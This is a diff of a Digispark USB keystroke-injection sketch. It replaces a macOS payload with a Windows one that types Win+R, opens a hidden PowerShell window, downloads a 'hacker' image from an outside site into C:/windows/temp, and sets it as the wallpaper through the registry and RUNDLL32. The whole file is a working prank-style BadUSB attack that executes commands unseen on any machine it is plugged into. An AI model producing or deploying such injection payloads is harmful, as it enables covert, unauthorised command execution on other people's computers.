@@ -1,26 +1,20 @@
+// Author : thewhiteh4t //
 #include "DigiKeyboard.h"
 void setup() {
+	pinMode(1, OUTPUT);
 }
-
 void loop() {
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print("Terminal");
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print("curl https://www.bleepstatic.com/images/stock-photos/hacking/hacker-hacking.jpg> /Users/Shared/wallpaper.jpg");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("osascript -e 'tell application \"Finder\" to set desktop picture to POSIX file \"/Users/Shared/wallpaper.jpg\"'");
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
-
-  for (;;) {
-    /*Stops the digispark from running the scipt again*/
-  }
+	DigiKeyboard.delay(3000);
+	DigiKeyboard.sendKeyStroke(0);
+ 	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+ 	DigiKeyboard.delay(300);
+ 	DigiKeyboard.print("powershell -windowstyle hidden"); 
+  	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(1000);
+	DigiKeyboard.print("iwr -Uri https://www.bleepstatic.com/images/stock-photos/hacking/hacker-hacking.jpg -OutFile C:/windows/temp/b.jpg;sp 'HKCU:Control Panel/Desktop' WallPaper 'C:/windows/temp/b.jpg';RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 5");
+  	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  	digitalWrite(1, HIGH);
+  	DigiKeyboard.delay(90000);
+  	digitalWrite(1, LOW);
+  	DigiKeyboard.delay(5000);
 }
